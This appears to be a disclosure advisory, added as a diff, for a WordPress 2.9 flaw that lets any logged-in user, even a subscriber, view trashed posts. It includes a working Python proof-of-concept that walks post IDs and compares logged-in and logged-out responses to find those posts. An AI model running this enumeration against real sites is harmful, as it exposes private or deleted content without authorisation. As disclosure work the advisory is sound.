@@ -1,0 +1,160 @@
+	WordPress >= 2.9 Failure to Restrict URL Access
+	      http://www.thomasmackenzie.co.uk/
+
+
+1. *Advisory Information*
+
+Title: WordPress >= 2.9 Failure to Restrict URL Access
+Date published:
+
+
+2. *Vulnerability Information*
+
+Class: Failure to Restrict URL Access
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+
+
+3. *Software Description*
+
+WordPress is a state-of-the-art publishing platform with a
+focus on aesthetics, web standards, and usability. WordPress
+is both free and priceless at the same time. [0]
+
+
+4. *Vulnerability Description*
+
+Frequently, the only protection for a URL is that links to that page
+are not presented to unauthorized users. Security by obscurity is
+not sufficient to protect sensitive functions and data in an application.
+Access control checks must be performed before a request to a sensitive
+function is granted, which ensures that the user is authorized to access
+that function. [1]
+
+
+5. *Vulnerable packages*
+
+Versions >= 2.9
+
+
+6. *Non-vulnerable packages*
+
+Versions < 2.9
+
+
+7. *Vulnerability Overview*
+
+Since version 2.9 a new feature was implemented so that users
+were able to retrieve posts that they may have deleted by accident.
+This new feature was labeled 'trash'. Any posts that are placed within
+the trash are only viewable by authenticated privileged users.
+
+
+8. *Technical Description*
+
+When WordPress implemented the new feature they failed to change the
+permissions granted when the post is in the trash. This means that
+an unauthenticated user cannot see the post, however an authenticated
+user can no matter what privilege's they have, even 'subcriber'.
+
+"Subscriber [User Level 0] - Somebody who can read
+comments/comment/receive news letters, etc." [2]
+
+
+9. *PoC*
+
+#/usr/bin/python
+#
+# WordPress > 2.9 Failure to Restrict URL Access PoC
+#
+# This script iterates through the WP post ID's as an authenticated
+and unauthenticated user.
+# If the requests differ a 'Trash' post has been found.
+#
+# You will need an authenticated user cookie of any privilege to run
+this script.
+#
+# Example cookie:
+# wordpress_logged_in_62b3ab14f277d92d3d313662ea0c84e3=test%7C1266245173%7C990157a59700a69edbf133aa22fca1f8
+#
+# Will only work with WP URLs with the '/?p={int}' parameter. Would
+need to handle redirects (3xx) to handle all URL types.
+#
+#
+# Research/PoC/Advisory By: Tom Mackenzie (tmacuk) and Ryan Dewhurst
+(ethicalhack3r)
+
+import httplib
+
+# Declare vars
+blogURL = "www.example.com"
+userCookie = "ENTER_COOKIE_HERE"
+postID = 0 #Leave at 0
+
+conn = httplib.HTTPConnection(blogURL)
+Headers = {"Cookie" : userCookie}
+
+print
+print "Target = http://" + blogURL + "/?p=" + str(postID)
+print
+
+while 1:
+
+ # Start non authenticated enumeration
+
+ request = '/?p=' + str(postID)
+ conn.request("GET", request, "")
+
+ try:
+  r1 = conn.getresponse()
+ except:
+  print "Connection error"
+
+ data1 = r1.read()
+
+ # Start authenticated enumeration
+
+ conn.request("GET", request, None, Headers)
+
+ try:
+  r2 = conn.getresponse()
+ except:
+  print "Connection error"
+
+ data2 = r2.read()
+
+ # Compare the HTML body reponses
+
+ if data1 != data2:
+  print "+ Found! http://" + blogURL + request
+ else:
+  print request
+
+ postID += 1
+
+conn.close()
+
+
+10. *Credits*
+
+Thomas Mackenzie (tmacuk) - http://www.thomasmackenzie.co.uk/
+Original finder and tester.
+
+Ryan Dewhurst (ethicalhack3r) - http://www.ryandewhurst.co.uk/
+PoC creation and analysis.
+
+Arron Finnon (f1nux) - http://www.finux.co.co.uk/
+Helped with documentation.
+
+Matthew Hughes - http://www.matthewhughes.co.uk/
+Helped with documentation.
+
+Robin Wood (digininja) - http://www.diginija.org/
+Helped identify the vulnerability type.
+
+
+11. *References*
+
+[0] http://wordpress.org/
+[1] http://www.owasp.org/index.php/Top_10_2007-Failure_to_Restrict_URL_Access
+[2] http://codex.wordpress.org/Roles_and_Capabilities
